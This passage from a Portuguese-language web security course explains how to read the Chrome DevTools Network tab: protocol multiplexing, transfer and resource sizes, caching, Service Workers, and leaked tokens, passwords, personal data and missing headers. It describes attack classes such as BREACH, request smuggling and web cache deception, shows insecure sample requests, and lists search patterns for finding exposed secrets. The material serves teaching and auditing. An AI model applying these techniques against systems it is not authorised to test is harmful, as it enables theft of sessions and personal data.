1. **Comportamento do `http/1.1` (Serialização por Conexão e Limite de 6 Sockets)**:
   - No HTTP/1.1, uma conexão TCP só pode processar **uma requisição por vez** de forma segura (o *HTTP pipelining* foi abandonado nos navegadores por falhas de implementação em proxies e *Head-of-Line Blocking* na camada de aplicação).
   - Para contornar isso, o navegador abre até **6 conexões TCP simultâneas por origem** (`esquema + host + porta`).
   - **Como aparece no DevTools**: ao carregar 24 arquivos de um mesmo domínio em `http/1.1`, você verá até **6 valores diferentes na coluna `Connection ID`** (ex.: `1041`, `1042`, `1043`, `1044`, `1045`, `1046`). No **Waterfall**, as 6 primeiras requisições iniciam juntas; as requisições 7 a 12 exibem uma longa barra branca de **Queueing**, formando uma "escada" (*staircase pattern*) de 6 em 6 degraus.

2. **Comportamento do `h2` (Multiplexação Binária sobre uma Única Conexão TCP)**:
   - O HTTP/2 introduz uma camada de enquadramento binário (*binary framing layer*) que divide requisições e respostas em pequenos quadros (*frames* `HEADERS`, `DATA`, `SETTINGS`, `WINDOW_UPDATE`) associados a fluxos numerados (*streams*).
   - Graças a isso, dezenas ou centenas de requisições para a mesma origem trafegam **simultaneamente dentro de uma única conexão TCP**.
   - **Como aparece no DevTools**: todas as 24 requisições para `https://loja-ficticia.test` exibem **exatamente o mesmo número na coluna `Connection ID`** (ex.: todas com `Connection ID: 2088`). Apenas a 1ª requisição exibe barras de `DNS Lookup`, `Initial connection` e `SSL`; as outras 23 iniciam quase no mesmo milissegundo no **Waterfall** (alinhadas verticalmente), sem `Queueing` de limite de conexões.
   - **Limitação residual do `h2`**: como todas as requisições compartilham uma única conexão TCP, se um único pacote TCP se perder na rede, o sistema operacional retém a entrega de todos os pacotes seguintes até a retransmissão chegar — fenômeno chamado de **TCP Head-of-Line (HoL) Blocking**.

3. **Comportamento do `h3` (Multiplexação sobre QUIC/UDP sem HoL Blocking de Transporte)**:
   - O HTTP/3 substitui o TCP pelo protocolo **QUIC** (RFC 9000) rodando sobre datagramas **UDP**. O próprio QUIC implementa controle de congestionamento, retransmissão e fluxos independentes no espaço do usuário, além de embutir o **TLS 1.3** diretamente no handshake inicial (permitindo estabelecimento em **1-RTT** ou até **0-RTT** em conexões retomadas) e suportar **migração de conexão** (ex.: o celular troca do Wi-Fi para o 5G mudando de IP, mas o `Connection ID` lógico do QUIC mantém a conexão ativa sem cair).
   - Se um pacote UDP se perde na rede, apenas o *stream* (a requisição específica) ao qual aquele pacote pertencia aguarda retransmissão; todas as outras requisições na mesma conexão `h3` continuam fluindo normalmente.

```text
Comparação Visual do Waterfall (12 requisições simultâneas para a mesma origem):

No HTTP/1.1 (6 Connection IDs diferentes — padrão em "escada"):
Req 1..6  (Conn 1..6):  [DNS][TCP][SSL][===TTFB===][Download]
Req 7..12 (Conn 1..6):  [..........Queueing..........][===TTFB===][Download]

No HTTP/2 (h2) e HTTP/3 (h3) (1 único Connection ID — multiplexação paralela):
Req 1     (Conn 99):    [DNS][TCP/QUIC+TLS][===TTFB===][Download]
Req 2..12 (Conn 99):                       [===TTFB===][Download]
```

##### Implicações de segurança e configuração dos protocolos

- **Pseudo-headers no DevTools**: quando a coluna `Protocol` indica `h2` ou `h3` e você marca a opção **Raw** em *Request Headers*, o DevTools exibe os pseudo-headers `:method`, `:scheme`, `:authority` e `:path` (que substituem a primeira linha textual `GET /caminho HTTP/1.1`).
- **HTTP/2 Desync / Request Smuggling (*H2.CL* e *H2.TE*)**: quando um proxy reverso ou CDN fala `h2` com o navegador do cliente, mas converte (*downgrades*) a requisição para `http/1.1` ao repassá-la para o servidor de aplicação interno, diferenças na validação de `Content-Length` ou `Transfer-Encoding` no processo de tradução `h2 -> http/1.1` podem permitir ataques severos de **HTTP Request Smuggling**.
  - **Configuração segura**: manter HTTP/2 de ponta a ponta ou garantir que o proxy reverso normalize estritamente cabeçalhos de tamanho antes de converter para HTTP/1.1 **[REQUISITO]**; manter o servidor web/proxy atualizado contra vulnerabilidades de DoS em HTTP/2 como *Rapid Reset* (CVE-2023-44487, na qual o cliente enviava milhares de frames `HEADERS` seguidos imediatamente de `RST_STREAM`) e *CONTINUATION Flood* **[REQUISITO]**.

---

<a id="s2-1-8"></a>
#### 2.1.8 Transfer Size, Resource Size, Cache e Service Workers

Na tabela de requisições da aba **Network**, a coluna **Size** (Tamanho) e o rodapé de resumo (*Summary Bar* na base da janela, que exibe `X kB / Y kB transferred` e `Z kB / W kB resources`) concentram informações cruciais sobre **compressão de dados**, **economia de banda**, **comportamento do cache** e **atuação de Service Workers**.

Por padrão, quando você ativa **Big request rows** (Linhas grandes de requisição, nas configurações da aba Network) ou passa o mouse sobre uma célula da coluna **Size**, o DevTools exibe **dois números**: o valor de cima é o **Transfer Size** e o valor de baixo (em cinza) é o **Resource Size**. Quando as linhas estão no tamanho compacto padrão, a coluna **Size** mostra o **Transfer Size** (ou a origem do cache, como `(disk cache)`).

A seguir, cada um desses quatro conceitos e parâmetros é detalhado com os 10 pontos obrigatórios.

##### Transfer Size

- **Nome do parâmetro**: `Transfer Size` (Tamanho Transferido pela Rede).
- **O que significa**: quantidade real de bytes que trafegou pela rede (sobre o fio) para entregar aquela resposta ao navegador — isto é, o tamanho do **corpo da resposta comprimido** (`gzip`, `br` ou `zstd`) somado aos bytes dos **cabeçalhos de resposta HTTP** recebidos.
- **Para que serve**: medir o consumo real de franquia de dados e largura de banda de rede de uma requisição ou da página inteira (exibido também no rodapé como `X MB transferred`).
- **Onde encontrar no DevTools**: painel **Network** → coluna **Size** da tabela de requisições (é o valor principal exibido na linha compacta ou o **valor superior** quando *Big request rows* está ativo / no *tooltip* ao passar o mouse sobre a coluna **Size**) e no rodapé inferior (`transferred`).
- **Exemplo prático**: um bundle JavaScript `app.js` possui `Resource Size` de `450 kB`, mas como o servidor aplicou compressão Brotli (`Content-Encoding: br`), a coluna **Size** mostra um `Transfer Size` de apenas **`112 kB`**. Se na recarga seguinte o arquivo vier do cache local sem ir à rede, o `Transfer Size` passa a ser `0 B` (exibindo `(disk cache)` ou `(memory cache)`).
- **Comportamento normal**: para todos os recursos textuais (`text/html`, `text/css`, `application/javascript`, `application/json`, `image/svg+xml`) maiores que ~1 kB, o `Transfer Size` deve ser significativamente **menor** (tipicamente 60% a 80% menor) que o `Resource Size`, confirmando que a compressão HTTP está funcionando. Para formatos binários que já possuem compressão nativa interna (como imagens `.webp`, `.jpg`, `.png`, vídeos `.mp4` e fontes `.woff2`), o `Transfer Size` será praticamente igual ao `Resource Size` (mais algumas centenas de bytes dos cabeçalhos HTTP).
- **O que seria considerado seguro**:
  - Compressão `br` (Brotli) ou `gzip` ativa para ativos estáticos públicos **[BOA PRÁTICA]**;
  - Em respostas `304 Not Modified`, `Transfer Size` muito pequeno (apenas algumas centenas de bytes referentes aos cabeçalhos da resposta condicional sem corpo);
  - Controle de tamanho transferido em APIs para evitar transferência massiva de registros não solicitados **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Oráculos de Compressão (Ataques tipo BREACH)**: quando uma resposta HTTPS utiliza compressão HTTP (`Transfer Size` varia conforme a redundância do texto) e, ao mesmo tempo, **1)** inclui no corpo um segredo estático (como um token CSRF ou dado privado) e **2)** reflete um parâmetro controlado pelo atacante na mesma resposta. Ao injetar palpites como `csrf=a`, `csrf=b` e medir pelo **Transfer Size** (no nível de pacotes TLS) qual resposta comprimiu mais (ficou menor porque a sequência repetida foi compactada pelo algoritmo LZ77/Huffman do `gzip`/`br`), um atacante na rede pode descobrir o segredo caractere por caractere;
  - **XS-Leaks por Tamanho de Transferência**: inferir se uma busca privada em outra origem retornou resultados comparando se o `Transfer Size` foi de `500 B` (lista vazia) ou `45 kB` (lista cheia).
- **Como investigar o problema**:
  1. Ative **Big request rows** (ícone de engrenagem **Network settings** no canto superior direito da aba Network → marque **Big request rows**) para visualizar simultaneamente `Transfer Size` (em cima) e `Resource Size` (embaixo) em todas as linhas;
  2. Verifique na aba **Headers** → *Response Headers* a presença de `Content-Encoding: br` ou `Content-Encoding: gzip`.
- **Como corrigir ou prevenir**: habilitar Brotli/Gzip no proxy reverso para recursos estáticos e APIs gerais **[BOA PRÁTICA]**; para mitigar ataques de canal lateral de compressão (BREACH) em páginas sensíveis, usar tokens CSRF mascarados por requisição (randomizados com XOR a cada resposta), cookies `SameSite`, não refletir entrada do usuário junto com segredos ou desativar compressão em respostas que contenham segredos de alta criticidade **[RECOMENDAÇÃO]**.

##### Resource Size

- **Nome do parâmetro**: `Resource Size` (Tamanho Descomprimido do Recurso).
- **O que significa**: tamanho real em bytes do corpo do recurso **após a descompressão** pelo navegador — exatamente a quantidade de bytes que o interpretador HTML, o motor JavaScript (V8) ou o decodificador de imagem terá de processar em memória.
- **Para que serve**: avaliar o impacto real do recurso sobre a **memória RAM e a CPU do dispositivo do usuário** (um JSON de `50 MB` descomprimido pode ter apenas `4 MB` de *Transfer Size* na rede graças ao Brotli, mas ainda vai consumir dezenas de megabytes de memória e travar a thread principal no `JSON.parse()`).
- **Onde encontrar no DevTools**: painel **Network** → coluna **Size** (é o **valor inferior** exibido quando **Big request rows** está ativo, ou o segundo valor exibido no *tooltip* ao passar o mouse sobre a célula da coluna **Size**), além do totalizador `resources` no rodapé da aba Network.
- **Exemplo prático**:

```text
Coluna Size (com Big request rows ativado):
  112 kB   <-- Transfer Size (bytes na rede, comprimido com Brotli + headers)
  450 kB   <-- Resource Size (bytes do arquivo .js descomprimido em memória)
```

- **Comportamento normal**: valores compatíveis com a função do recurso (scripts principais enxutos e divididos por rota — *code splitting*, respostas JSON contendo apenas a página atual de resultados).
- **O que seria considerado seguro**: limites rígidos no servidor tanto para o volume comprimido quanto para o volume descomprimido de entradas e saídas, prevenindo exaustão de memória no cliente e no servidor **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Bomba de Descompressão (*Compression Bomb* / *Zip Bomb* / *Gzip Bomb*) ou JSON Gigante**: uma resposta com `Transfer Size` aparentemente inofensivo (`150 kB`), mas com `Resource Size` de `800 MB` de caracteres repetidos, capaz de congelar a aba do navegador (*Client-Side DoS* / *Out of Memory*);
  - **Excessive Data Exposure**: uma resposta de API cuja interface mostra apenas 5 linhas na tabela da tela, mas cujo `Resource Size` é de `12 MB`, indicando que o servidor enviou um dump enorme de objetos JSON que o front-end descartou ou filtrou apenas visualmente.
- **Como investigar o problema**: ative **Big request rows** e procure discrepâncias extremas entre `Transfer Size` e `Resource Size`, ou respostas de API (`Fetch/XHR`) com `Resource Size` na casa dos megabytes; abra a aba **Preview** e **Response** para examinar o que está inflando o conteúdo.
- **Como corrigir ou prevenir**: paginar e filtrar dados no banco de dados/back-end (nunca enviar a tabela inteira para paginar no front-end) **[REQUISITO]**; validar limites de descompressão no servidor ao receber payloads comprimidos **[REQUISITO]**.

##### Cache ((memory cache), (disk cache), (prefetch cache), 304 Not Modified)

- **Nome do parâmetro**: Indicadores de Cache na coluna `Size` e `Status`: **`(memory cache)`**, **`(disk cache)`**, **`(prefetch cache)`** e **`304 Not Modified`**.
- **O que significa**: indicações exibidas pelo DevTools quando uma requisição é total ou parcialmente atendida por uma das camadas de cache do navegador:
  1. **`(memory cache)`**: o recurso foi recuperado instantaneamente da **memória RAM** do processo de renderização atual (sem tocar na rede nem no disco). Ocorre tipicamente quando o mesmo ativo (imagem, script, fonte) é referenciado mais de uma vez na mesma página ou durante navegações rápidas na mesma aba. É volátil: desaparece assim que a aba é fechada;
  2. **`(disk cache)`**: o recurso foi lido do **Cache HTTP em disco (SSD/HD)** do navegador sem enviar nenhuma requisição ao servidor, porque a cópia armazenada ainda estava fresca (*fresh*) segundo o cabeçalho `Cache-Control: max-age=...` ou `Expires` recebido anteriormente. Persiste mesmo após fechar e reabrir o navegador;
  3. **`(prefetch cache)`**: o recurso havia sido baixado antecipadamente em segundo plano por uma dica de pré-busca (`<link rel="prefetch">` ou *Speculation Rules API*) e foi consumido a partir desse cache de pré-busca **[Varia por versão]**;
  4. **`304 Not Modified`**: a cópia em cache havia expirado (ou tinha `Cache-Control: no-cache` / `max-age=0, must-revalidate`), então o navegador **foi até o servidor** enviando uma requisição condicional com `If-None-Match: "etag-xyz"` ou `If-Modified-Since: ...`. O servidor verificou que o arquivo não mudou e respondeu `304 Not Modified` **sem enviar o corpo novamente** — o navegador reutilizou o corpo que já estava no disco.
- **Para que serve**: distinguir com exatidão se o navegador **não contatou o servidor** (`(memory cache)` e `(disk cache)`) ou se **contatou o servidor apenas para validar** (`304 Not Modified`), permitindo auditar performance e políticas de retenção de dados sensíveis no cliente.
- **Onde encontrar no DevTools**: painel **Network** → colunas **Status** e **Size** da tabela de requisições (e em *Headers* → *General* → *Status Code*).
  - **Atenção**: se a caixa **Disable cache** estiver marcada na barra superior do painel Network, o navegador ignora `(memory cache)` e `(disk cache)` enquanto o DevTools estiver aberto! Portanto, **para auditar o comportamento real de cache da aplicação, você deve DESMARCAR a opção `Disable cache`**.
- **Exemplo prático**:

| Requisição | Coluna `Status` | Coluna `Size` | Coluna `Time` | Foi à rede? |
|---|---|---|---|---|
| `logo.svg` (repetido no rodapé) | `200` | `(memory cache)` | `0 ms` | **Não** |
| `bundle.8f9a1c.js` (`max-age=31536000`) | `200` | `(disk cache)` | `2 ms` | **Não** |
| `catalogo.json` (`ETag` revalidado) | `304` | `180 B` (só headers) / `42 kB` (recurso) | `28 ms` | **Sim** (só cabeçalhos) |
| `extrato.json` (`Cache-Control: no-store`) | `200` | `4.2 kB` / `11.8 kB` | `95 ms` | **Sim** (completo) |

- **Comportamento normal**: ativos estáticos públicos (CSS, JS, fontes, imagens de layout) vêm de `(memory cache)` ou `(disk cache)` nas navegações subsequentes; endpoints de API autenticados e páginas com dados pessoais **nunca** vêm de `(disk cache)` sem validação e usam `no-store`.
- **O que seria considerado seguro**:
  - Dados sensíveis, financeiros, médicos ou pessoais sempre respondidos com `Cache-Control: no-store` (impedindo gravação em `(disk cache)`) **[REQUISITO]**;
  - Ativos estáticos públicos com hash de conteúdo no nome do arquivo (`app.a1b2c3d4.js`) servidos com `Cache-Control: public, max-age=31536000, immutable` **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Persistência de Dados Sensíveis em Disco (`(disk cache)`)**: uma requisição como `GET /api/v1/dados-pessoais` ou `GET /minha-conta/cartoes` aparece com `200 OK (from disk cache)`. Isso significa que o JSON contendo CPF, endereço e dados bancários foi gravado sem criptografia adicional no diretório de cache do navegador no disco rígido do computador. Em um computador compartilhado (laboratório, biblioteca, hospital, escritório), mesmo após o usuário fechar a aba, qualquer pessoa ou processo local (ou o botão Voltar) pode recuperar esses dados do `(disk cache)`;
  - **Web Cache Deception**: um servidor mal configurado ignora extensões desconhecidas no final de rotas dinâmicas (ex.: `/minha-conta/perfil/estilo.css` retorna o HTML/JSON privado do perfil do usuário com status `200`), e a CDN/cache intermediário vê a extensão `.css` e armazena os dados privados da vítima em cache público para qualquer pessoa ler.
- **Como investigar o problema**:
  1. **Desmarque** a caixa **Disable cache** na barra superior do painel Network;
  2. Faça login na aplicação, navegue pelas telas que exibem dados confidenciais e depois recarregue ou navegue de volta;
  3. Verifique na coluna **Size** se algum endpoint de API privada ou documento HTML autenticado exibiu `(disk cache)` ou `(memory cache)` e confira o cabeçalho `Cache-Control` na aba **Headers**;
  4. Faça **logout** e tente acessar a URL privada novamente ou clicar no botão **Voltar** do navegador para verificar se a resposta ainda é entregue do cache.
- **Como corrigir ou prevenir**: definir `Cache-Control: no-store` em todas as respostas que contenham dados privados ou autenticados **[REQUISITO]**; configurar CDNs para nunca armazenar em cache respostas baseadas apenas na extensão da URL sem respeitar o `Cache-Control` do servidor de origem (*Origin Cache Control*) e nunca cachear respostas que contenham `Set-Cookie` **[REQUISITO]**.

##### Service Workers ((ServiceWorker))

- **Nome do parâmetro**: Indicador `(ServiceWorker)` / `(from service worker)` nas colunas `Size`, `Status` e `Initiator`.
- **O que significa**: indica que a requisição feita pela página foi interceptada pelo evento `fetch` de um **Service Worker** registrado para aquela origem. Quando uma requisição passa por um Service Worker, o painel **Network** frequentemente exibe **duas linhas** relacionadas (ou identifica a origem com o ícone de engrenagem ⚙️) **[Varia por versão]**:
  1. A requisição feita pela **página** para o Service Worker: apresenta na coluna **Size** o texto **`(ServiceWorker)`** (ou `(from service worker)` no `Status Code`), indicando que quem entregou a resposta final para a página foi o Service Worker;
  2. Se o Service Worker não tinha o recurso no `Cache Storage` e decidiu buscá-lo na internet (`fetch(event.request)`), aparece uma **segunda linha** iniciada pelo próprio Service Worker (com o ícone ⚙️ ao lado do nome na coluna **Name** e o script `sw.js` na coluna **Initiator**), que mostra o `Transfer Size` real gasto na rede!
- **Para que serve**: deixar transparente para o desenvolvedor e para o auditor de segurança quais requisições foram interceptadas por código JavaScript rodando em segundo plano no navegador e distinguir quando o Service Worker respondeu a partir do seu próprio cache (`Cache Storage` / IndexedDB) versus quando ele buscou na rede.
- **Onde encontrar no DevTools**: painel **Network** → colunas **Name** (ícone ⚙️), **Status** (`200 OK (from service worker)`), **Size** (`(ServiceWorker)`) e **Initiator** (`sw.js`).
- **Exemplo prático**:

| Linha na Tabela | Coluna `Name` | Coluna `Status` | Coluna `Size` | Coluna `Initiator` | O que aconteceu? |
|---|---|---|---|---|---|
| 1 | `catalogo.json` | `200` | `(ServiceWorker)` | `app.js:45` | A página pediu `catalogo.json` e o Service Worker interceptou |
| 2 | `⚙️ catalogo.json` | `200` | `8.4 kB` | `sw.js:18` | O Service Worker buscou `catalogo.json` na rede e repassou à linha 1 |
| 3 | `offline-shell.html` | `200` | `(ServiceWorker)` | `Other` | O Service Worker respondeu direto do `Cache Storage` (sem linha `⚙️` de rede) |

- **Comportamento normal**: em PWAs (*Progressive Web Apps*) e sites com suporte offline, o Service Worker responde instantaneamente aos arquivos da casca da aplicação (*App Shell*: HTML base, CSS, JS, ícones) direto do `Cache Storage` e repassa chamadas de API para a rede.
- **O que seria considerado seguro**:
  - O arquivo do Service Worker (`sw.js`) é servido com `Cache-Control: no-cache` (para que atualizações de segurança no Service Worker sejam detectadas imediatamente pelo navegador) e protegido contra injeção **[RECOMENDAÇÃO]**;
  - Respostas autenticadas não ficam salvas no `Cache Storage` após o encerramento da sessão **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Uma chamada de API sensível (`GET /api/perfil`) exibindo apenas a linha `(ServiceWorker)` **sem** a linha correspondente `⚙️` de rede mesmo após o usuário ter feito logout — prova de que o Service Worker guardou dados privados no `Cache Storage` e está servindo-os sem autenticação;
  - Linhas iniciadas por `⚙️ sw.js` enviando cópias das requisições ou tokens para um domínio externo suspeito (sinal de Service Worker malicioso ou dependência comprometida importada via `importScripts()`).
- **Como investigar o problema**:
  1. Observe na tabela do Network se há linhas com `(ServiceWorker)` na coluna **Size** ou com o ícone `⚙️` na coluna **Name**;
  2. Clique na linha `⚙️` e veja a coluna **Initiator** para identificar o arquivo exato do Service Worker (`sw.js`);
  3. Abra a aba **Application** → **Service Workers** (para inspecionar o script ativo ou marcar *Bypass for network*) e **Application** → **Cache Storage** (para ver todos os pares requisição/resposta salvos pelo Service Worker).
- **Como corrigir ou prevenir**: no código do Service Worker (`sw.js`), aplicar estratégia *Network Only* para rotas de autenticação e dados sensíveis **[REQUISITO]**; limpar o `Cache Storage` no evento de logout ou via header `Clear-Site-Data: "cache", "storage"` **[RECOMENDAÇÃO]**; nunca usar `importScripts()` apontando para CDNs externas sem controle estrito **[REQUISITO]**.


<a id="s2-1-9"></a>
#### 2.1.9 Análise de Segurança na Aba Network (Casos Críticos)

Em provas acadêmicas, entrevistas técnicas de cibersegurança e auditorias reais de aplicações web (sempre realizadas em ambientes de laboratório autorizados ou sistemas sob contrato formal de teste), a aba **Network** do Chrome DevTools é o primeiro instrumento de diagnóstico passivo e ativo. Sem instalar nenhum software externo, o analista consegue detectar falhas graves de criptografia, sessão, autorização, configuração e vazamento de dados apenas inspecionando o tráfego HTTP/HTTPS que o próprio navegador processa.

A seguir, estudaremos em profundidade os **10 casos críticos de segurança na aba Network**, apresentando para cada um: **o que acontece**, **como a falha aparece na prática no DevTools** (com exemplos de requisição e resposta), **como investigar passo a passo** usando os filtros e abas do painel Network e **como corrigir ou prevenir**.

---

##### 1. Exposição de tokens (em URLs, respostas, headers `Referer` ou sem `HttpOnly`)

- **O que é o problema**: tokens de autenticação — como **JWTs** (*JSON Web Tokens*, RFC 7519), tokens OAuth 2.0 (`access_token`, `refresh_token`, RFC 6749), chaves de API privadas (`api_key`) ou identificadores de sessão — são expostos em locais onde terceiros, scripts maliciosos ou sistemas de log conseguem capturá-los:
  1. Na própria **URL / Query String** (`?token=eyJ...`), ficando gravados no histórico, em logs de proxy/CDN e vazando via cabeçalho `Referer` para scripts/imagens de terceiros;
  2. Em cookies `Set-Cookie` **sem a flag `HttpOnly`**, ficando acessíveis a qualquer payload de XSS via `document.cookie`;
  3. Retornados no corpo JSON do login e salvos pelo front-end em `localStorage` ou `sessionStorage` (também acessíveis via XSS), ou vazados em endpoints públicos de consulta.
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
# 1ª Requisição: navegação para página autenticada com token na URL
GET /painel?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9.SignAqui HTTP/1.1
Host: app.loja-ficticia.test

# 2ª Requisição (disparada pela página acima): carregamento de imagem/script de terceiro
GET /widget.js HTTP/1.1
Host: cdn.terceiro-analytics.test
Referer: https://app.loja-ficticia.test/painel?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9.SignAqui
```

- **Como investigar na aba Network**:
  1. Abra a busca global do painel Network (`Ctrl+F`) e pesquise por `eyJ` (prefixo universal em Base64URL de qualquer cabeçalho JSON que começa com `{"`), `token`, `Bearer`, `api_key`, `access_token` e `refresh_token`;
  2. Filtre a lista de requisições por **3rd-party requests** (checkbox na barra de filtros) ou use `-domain:*.loja-ficticia.test` para ver apenas chamadas para terceiros e inspecione o cabeçalho **`Referer`** em *Request Headers*;
  3. Na resposta do login (`POST /login` ou `/auth/token`), verifique na aba **Cookies** se o cookie que carrega o token possui `HttpOnly` (`✓`) e `Secure` (`✓`).
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Nunca transportar tokens de sessão ou autenticação em parâmetros de URL (*query string*); se um fluxo OAuth legado usar URL, migrar para **Authorization Code Flow com PKCE** (RFC 7636) trocando o código curto via `POST`;
  - **[REQUISITO]** Armazenar tokens de sessão preferencialmente em cookies com atributos **`HttpOnly; Secure; SameSite=Strict`** (ou `Lax`) e prefixo `__Host-`;
  - **[RECOMENDAÇÃO]** Configurar o cabeçalho de resposta **`Referrer-Policy: strict-origin-when-cross-origin`** ou **`no-referrer`** para garantir que caminhos e query strings nunca sejam enviados em cabeçalhos `Referer` para outras origens.

---

##### 2. Senhas transmitidas indevidamente (via GET, em texto plano sobre HTTP, ou ecoadas na resposta)

- **O que é o problema**: a senha do usuário é tratada de forma insegura durante o trânsito ou resposta em três cenários clássicos de prova e de auditoria:
  1. **Envio via método `GET`**: o desenvolvedor cria um `<form method="GET">` (ou esquece o atributo `method`, cujo padrão no HTML é `GET`!) ou faz `fetch('/api/login?user=ana&pass=Senha123')`. A senha vai parar na `Request URL` e em todos os logs de acesso HTTP do servidor, proxy e histórico do navegador;
  2. **Envio sobre `http://` (sem TLS)**: mesmo usando `POST`, se a `Request URL` começar com `http://`, o corpo (*Form Data* ou *Request Payload*) trafega em texto claro pela placa de rede, Wi-Fi e roteadores intermediários;
  3. **Senha ecoada na resposta HTTP**: após o cadastro (`POST /usuarios`) ou ao consultar o perfil (`GET /perfil`), o servidor devolve o objeto JSON do usuário incluindo a própria senha em texto claro ou o hash da senha (`"senha": "..."` ou `"password_hash": "$2b$12$..."`).
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
# Cenário A: Login via GET (Gravíssimo — senha exposta na Request URL)
GET /api/v1/login?email=carlos%40exemplo.test&senha=MinhaSenh4! HTTP/1.1
Host: loja-ficticia.test

# Cenário B: Resposta de criação de conta ecoando a senha de volta no JSON
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 901,
  "email": "carlos@exemplo.test",
  "senhaTexto": "MinhaSenh4!",
  "criadoEm": "2026-10-30T10:00:00Z"
}
```

- **Como investigar na aba Network**:
  1. Marque **Preserve log** antes de testar os fluxos de cadastro, login e alteração de senha;
  2. Verifique na requisição de login a seção **General**: o `Request Method` deve ser obrigatoriamente **`POST`** e a `Request URL` deve começar com **`https://`** (sem parâmetros na URL);
  3. Use `Ctrl+F` no painel Network e digite a senha de teste que você acabou de informar no formulário para verificar onde ela aparece: ela só pode aparecer no **Form Data / Request Payload** da requisição `POST` de login/cadastro, **nunca** em uma URL (`GET`) e **nunca** na aba **Response** de nenhuma requisição.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Transmitir senhas exclusivamente no corpo (*body*) de requisições **`POST`** sobre **`HTTPS`** (TLS 1.2 ou TLS 1.3);
  - **[REQUISITO]** No back-end, aplicar hash lento com *salt* criptográfico (**Argon2id**, **bcrypt** ou **scrypt**) imediatamente após receber a senha, descartar a senha em texto plano da memória e **jamais** incluir os campos `password` ou `password_hash` nos DTOs de resposta da API.

---

##### 3. Informações sensíveis em URLs (CPF, e-mail, tokens de reset na query string)

- **O que é o problema**: além de senhas e tokens de sessão, aplicações frequentemente expõem dados pessoais protegidos por leis de privacidade (como a LGPD — Lei Geral de Proteção de Dados, Lei nº 13.709/2018, e o GDPR europeu) ou segredos temporários diretamente na URL: número de CPF, data de nascimento, número de cartão de crédito, endereço de e-mail, telefone, diagnóstico médico ou tokens de recuperação de senha (`?reset_token=...`).
- **Por que é perigoso mesmo com HTTPS**: embora o TLS criptografe o caminho e a query string **durante o trânsito na rede**, a URL completa é armazenada sem criptografia em:
  - Histórico local do navegador e sincronização de conta do navegador;
  - Logs de acesso padrão de servidores web (`access.log` do Nginx/Apache), balanceadores de carga, WAFs e CDNs;
  - Ferramentas de APM (*Application Performance Monitoring*), *analytics* e relatórios de erro de front-end (como Sentry, Datadog, Google Analytics), que capturam `window.location.href`;
  - Cabeçalho `Referer` enviado para sub-recursos externos caso a `Referrer-Policy` não seja restritiva.
- **Como aparece no DevTools (Exemplo Inseguro)**:

```text
General
  Request URL: https://clinica-ficticia.test/laudos/buscar?cpf=123.456.789-00&paciente=Maria+Silva&nascimento=1990-05-14
  Request Method: GET
  Status Code: 200 OK
  Referrer Policy: no-referrer-when-downgrade
```

- **Como investigar na aba Network**:
  1. Ative a coluna **URL** e a coluna **Path** na tabela do painel Network;
  2. Navegue pelos fluxos de busca de cliente, checkout, segunda via de boleto e recuperação de senha;
  3. Inspecione a aba **Payload** → **Query String Parameters** de todas as requisições;
  4. Na página de "Redefinir Senha" (acessada via link de e-mail `https://app.exemplo.test/reset?token=abc123xyz`), observe se a página carrega scripts externos (fontes, chat de suporte, analytics) e se o `token=abc123xyz` vaza no cabeçalho `Referer` dessas requisições externas!
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Enviar buscas por CPF, e-mail ou dados sensíveis no corpo de uma requisição **`POST`** (ex.: `POST /api/laudos/buscar` com corpo JSON `{"cpf": "..."}`) ou usar identificadores substitutos opacos (UUIDs randômicos sem significado pessoal, como `/pacientes/550e8400-e29b-41d4-a716-446655440000`);
  - **[RECOMENDAÇÃO]** Em links de redefinição de senha enviados por e-mail, assim que o usuário abrir a página, validar o token de uso único, consumi-lo ou removê-lo da barra de endereços via `history.replaceState()` antes de carregar qualquer recurso externo, além de enviar `Referrer-Policy: no-referrer` na página de redefinição.

---

##### 4. Headers de segurança ausentes

- **O que é o problema**: o servidor entrega documentos HTML e respostas de API funcionando visualmente bem (`200 OK`), mas omite os cabeçalhos HTTP defensivos que instruem o navegador a ativar camadas vitais de proteção contra *clickjacking*, *MIME sniffing*, *downgrade* para HTTP e execução de scripts injetados (XSS).
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
HTTP/1.1 200 OK
Date: Fri, 30 Oct 2026 10:30:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 4520

# Repare no que NÃO está aqui:
# - Não há Strict-Transport-Security (HSTS)
# - Não há Content-Security-Policy (CSP)
# - Não há X-Content-Type-Options: nosniff
# - Não há X-Frame-Options nem CSP frame-ancestors
# - Não há Referrer-Policy
# - Não há Permissions-Policy
```

- **Como investigar na aba Network**:
  1. Clique no filtro **Doc** na barra de filtros para focar no documento HTML principal da página;
  2. Abra a aba **Headers** → **Response Headers** e verifique a presença dos cabeçalhos de segurança (detalhados na [Seção 5 — Headers de Segurança HTTP](./05-headers-de-seguranca.md#s5));
  3. Para auditar todas as requisições de uma vez, clique com o botão direito no cabeçalho das colunas da tabela → **Response Headers** → **Manage Header Columns...** e adicione colunas para `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options` e `X-Frame-Options`;
  4. Use filtros negativos na caixa de busca, como `-has-response-header:x-content-type-options`, para listar imediatamente todas as respostas que esqueceram o cabeçalho.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Configurar `X-Content-Type-Options: nosniff` em todas as respostas;
  - **[RECOMENDAÇÃO]** Configurar `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (após garantir HTTPS em todos os subdomínios), `Content-Security-Policy` restritiva com `frame-ancestors 'none'` (ou `'self'`), `X-Frame-Options: DENY` (ou `SAMEORIGIN`), `Referrer-Policy: strict-origin-when-cross-origin` e `Permissions-Policy` desativando sensores não utilizados.

---

##### 5. Cookies inseguros (`Set-Cookie` sem `HttpOnly`, `Secure`, `SameSite`)
